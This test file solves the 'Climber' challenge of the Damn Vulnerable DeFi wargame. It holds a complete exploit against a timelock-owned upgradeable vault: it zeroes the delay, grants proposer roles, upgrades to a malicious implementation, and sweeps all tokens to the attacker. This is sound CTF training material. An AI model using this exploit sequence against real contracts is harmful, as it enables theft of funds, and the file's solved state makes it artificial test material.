const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');
const { resetAccounts } = require('../utils/reset');

describe('[Challenge] Climber', function () {
  let deployer, proposer, sweeper, attacker;

  // Vault starts with 10 million tokens
  const VAULT_TOKEN_BALANCE = ethers.utils.parseEther('10000000');

  before(async function () {
    await resetAccounts();
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, proposer, sweeper, attacker] = await ethers.getSigners();

    await ethers.provider.send("hardhat_setBalance", [
      attacker.address,
      "0x16345785d8a0000", // 0.1 ETH
    ]);
    expect(
      await ethers.provider.getBalance(attacker.address)
    ).to.equal(ethers.utils.parseEther('0.1'));

    // Deploy the vault behind a proxy using the UUPS pattern,
    // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
    this.vault = await upgrades.deployProxy(
      await ethers.getContractFactory('ClimberVault', deployer),
      [deployer.address, proposer.address, sweeper.address],
      { kind: 'uups' }
    );

    expect(await this.vault.getSweeper()).to.eq(sweeper.address);
    expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt('0');
    expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
    expect(await this.vault.owner()).to.not.eq(deployer.address);

    // Instantiate timelock
    let timelockAddress = await this.vault.owner();
    this.timelock = await (
      await ethers.getContractFactory('ClimberTimelock', deployer)
    ).attach(timelockAddress);

    // Ensure timelock roles are correctly initialized
    expect(
      await this.timelock.hasRole(await this.timelock.PROPOSER_ROLE(), proposer.address)
    ).to.be.true;
    expect(
      await this.timelock.hasRole(await this.timelock.ADMIN_ROLE(), deployer.address)
    ).to.be.true;

    // Deploy token and transfer initial token balance to the vault
    this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
    await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
  });

  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    function abiEncodeWithSignature(signature, ...params) { // similar to abi.encodeWithSignature in Solidity
      const functionName = signature.split("(")[0].replace("function", "").trim();
      return (new ethers.utils.Interface([signature])).encodeFunctionData(functionName, params);
    }

    const attackerContract = await (await ethers.getContractFactory("AttackerC12")).connect(attacker).deploy(this.timelock.address, this.vault.address, this.token.address);
    const maliciousVaultImplementation = await (await ethers.getContractFactory("MaliciousVaultImplementation")).connect(attacker).deploy();

    const execution0 = {
      target: this.timelock.address,
      dataElement: abiEncodeWithSignature("function updateDelay(uint64)", 0)
    };
    const execution1 = {
      target: this.timelock.address,
      dataElement: abiEncodeWithSignature(
        "function grantRole(bytes32,address)",
        await this.timelock.PROPOSER_ROLE(),
        this.timelock.address
      )
    };
    const execution2 = {
      target: this.timelock.address,
      dataElement: abiEncodeWithSignature(
        "function grantRole(bytes32,address)",
        await this.timelock.PROPOSER_ROLE(),
        attackerContract.address
      )
    };
    const execution3 = {
      target: this.vault.address,
      dataElement: abiEncodeWithSignature("function upgradeTo(address)", maliciousVaultImplementation.address)
    };
    const execution4 = {
      target: this.vault.address,
      dataElement: abiEncodeWithSignature("function _setSweeper(address)", attackerContract.address)
    };
    const execution5 = {
      target: attackerContract.address,
      dataElement: abiEncodeWithSignature("function schedule()")
    };

    const params = [execution0, execution1, execution2, execution3, execution4, execution5].map(exec => { exec.value = 0; return exec; });

    await attackerContract.connect(attacker).exploit(
      params.map(p => p.target),
      params.map(p => p.value),
      params.map(p => p.dataElement)
    );
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    expect(await this.token.balanceOf(this.vault.address)).to.eq('0');
    expect(await this.token.balanceOf(attacker.address)).to.eq(VAULT_TOKEN_BALANCE);
  });
});
